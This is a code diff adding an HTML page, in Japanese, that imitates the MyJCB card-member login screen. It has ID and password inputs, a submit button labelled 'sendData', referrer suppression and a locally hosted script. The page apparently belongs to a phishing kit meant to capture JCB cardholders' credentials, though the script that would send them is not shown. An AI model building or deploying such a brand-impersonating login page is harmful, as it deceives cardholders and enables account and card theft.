@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
+  <meta name="theme-color" content="#0099f6" />
+  <meta name="referrer" content="no-referrer" />
+  <title>MyJCB</title>
+  <link rel="stylesheet" href="./css/main.css" />
+</head>
+<body>
+  <form id="loginForm" novalidate>
+    <header aria-hidden="true"></header>
+    <section class="panel">
+      <p class="panel-title">MyJCB</p>
+      <input
+        type="text"
+        class="input input-login"
+        id="login"
+        name="login"
+        placeholder="IDを入力してください"
+        autocomplete="username"
+      />
+      <input
+        type="password"
+        class="input input-password"
+        id="password"
+        name="password"
+        placeholder="パスワードを入力してください"
+        autocomplete="current-password"
+      />
+      <div class="remember-row" id="rememberRow" role="button" tabindex="0" aria-pressed="false">
+        <img id="checkOff" src="./assets/check-off.png" width="20" height="20" alt="" />
+        <img id="checkOn" src="./assets/check-on.png" width="20" height="20" alt="" style="display: none" />
+        <span>次回から簡単ログインを利用する</span>
+      </div>
+      <button type="submit" class="button" id="sendData">ログイン</button>
+      <p class="link-row">
+        パスワードをお忘れの方
+        <img src="./assets/icon-4.png" width="8" height="8" alt="" />
+      </p>
+      <div class="support-box">
+        <span style="margin-left: 18px">サポート</span>
+        <img src="./assets/icon-3.png" width="18" height="18" alt="" />
+      </div>
+      <p class="link-row">
+        MyJCB IDをお持ちでない方
+        <img src="./assets/icon-5.png" width="8" height="8" alt="" />
+      </p>
+      <p class="link-row">
+        JCBカードをお持ちでない方
+        <img src="./assets/icon-5.png" width="8" height="8" alt="" />
+      </p>
+    </section>
+  </form>
+  <div class="toast" id="toast" role="status" aria-live="polite"></div>
+  <script src="./js/main.js"></script>
+</body>
+</html>
